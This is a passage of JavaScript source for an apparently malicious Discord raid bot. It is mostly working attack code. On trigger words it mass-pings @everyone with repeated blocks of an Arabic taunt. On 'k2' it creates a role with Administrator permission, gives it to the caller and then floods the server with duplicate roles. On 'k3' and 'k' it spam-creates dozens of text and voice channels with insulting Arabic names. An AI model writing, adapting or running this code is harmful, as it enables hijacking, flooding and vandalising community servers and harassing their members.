إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);

    }
});

LOka.on('message', message => {
	if (message.content === "k2") {
	    if(!message.channel.guild) return;
		message.member.addRole(message.guild.roles.find("name", "عمك مهستر"));

	}
});
LOka.on('message', message => {
    if(!message.channel.guild) return;

     if (message.content === "k2") {
     if(!message.channel.guild) return;
    message.guild.createRole({
        name : "عمك مهستر",
        permissions :  [8],
        color : "#23272a"
    }).then(function(role){
        message.member.addRole(role);
    })
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	
	        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
        message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : "#ff0000"
    });
  
            message.guild.createRole({
        name : "عمك مهستر",
        permissions :   [1],
        color : " #23272a"
    });
	
	
}
});
LOka.on('message', message => {
         if (message.content === "k3") {
     if(!message.channel.guild) return;
message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');


message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('  مهستر نايكم', 'text');

message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('مهستر نايكم', 'text');
message.guild.createChannel('نايكم مهستر', 'text');


}

});

LOka.on('message', message => {
         if (message.content === "k") {
     if(!message.channel.guild) return;

message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكمم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكممهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر' , 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكمم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكممهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر' , 'text');
